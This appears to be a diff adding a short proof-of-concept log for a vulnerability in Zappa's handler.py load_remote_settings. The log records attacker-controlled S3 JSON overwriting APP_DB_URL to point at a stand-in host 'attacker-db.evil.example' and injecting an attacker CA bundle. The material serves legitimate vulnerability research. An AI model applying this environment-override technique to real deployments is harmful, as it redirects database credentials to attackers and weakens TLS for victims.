@@ -1,0 +1,8 @@
+[INFO] exercising: zappa/handler.py:244-284 load_remote_settings (sink :281)
+[SETUP] pre-seeding a trusted env var APP_DB_URL=postgres://real-db.internal/app
+[STEP] load_remote_settings reads attacker S3 JSON that re-defines APP_DB_URL + REQUESTS_CA_BUNDLE
+[INFO] APP_DB_URL after load        = 'postgres://attacker-db.evil.example/steal'
+[INFO] REQUESTS_CA_BUNDLE after load = '/tmp/attacker-ca.pem'
+[PROOF] the S3 JSON overwrote the pre-existing APP_DB_URL (redirecting the DB to an attacker host) and injected REQUESTS_CA_BUNDLE (weakening TLS) — whoever can write the remote_env object controls the function's environment at every cold start.
+[OK] exploit confirmed — remote_env overwrites/injects environment variables
+==> VULN-026: CONFIRMED — remote_env S3 JSON overwrites existing os.environ keys
